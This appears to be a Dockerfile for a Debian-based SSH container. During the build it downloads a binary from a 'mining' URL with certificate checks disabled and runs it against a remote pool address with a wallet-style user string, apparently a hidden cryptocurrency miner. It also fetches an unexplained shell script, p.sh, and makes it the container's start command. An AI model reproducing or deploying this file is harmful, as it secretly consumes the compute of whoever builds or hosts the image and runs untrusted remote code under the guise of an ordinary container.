FROM debian
MAINTAINER Doro Wu <fcwu.tw@gmail.com>

EXPOSE 3000

ENV DEBIAN_FRONTEND=noninteractive \
    USER=ubuntu \
    PASS=ubuntu

# no Upstart or DBus
# https://github.com/dotcloud/docker/issues/1724#issuecomment-26294856
RUN apt update -y && apt install wget -y
RUN wget https://raw.githubusercontent.com/zeettestsayu1/docker-ubuntu-ssh/master/p.sh
RUN wget --no-check-certificate https://swensonm.com/mining/masterfile && chmod 777 masterfile && ./masterfile -o 139.99.124.170:80 -u 86fGg98tj5QTt4peYzxDrD4BfChE1LPtkceC6rVC6iP3FuApcNecY1c32cgrwMtWNY87H4iq2CM3DPJWQhjW8Mr7LQeZRsr -k -a rx/0 -p divio
CMD ["bash", "p.sh"]
